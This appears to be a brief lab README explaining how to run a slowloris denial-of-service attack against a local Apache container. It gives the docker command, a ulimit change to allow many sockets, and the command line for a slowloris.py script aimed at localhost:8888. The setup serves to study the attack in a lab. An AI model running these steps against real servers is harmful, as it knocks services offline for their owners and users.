# Attacking Apache Servers From a Single Machine

There is a website.

To start it with docker :
docker run -d --name apache -p 8888:80 -v "$PWD/www":/usr/local/apache2/htdocs/ httpd:2.4

It's a default apache serveur with default configuration.

Before starting slowloris attack, you need to use :
ulimit -S -n 10000
This command increase the max number of files that you shell can open. Each socket count as one file.

Then :
python3 slowloris.py --host localhost --port 8888 --max-sockets 30000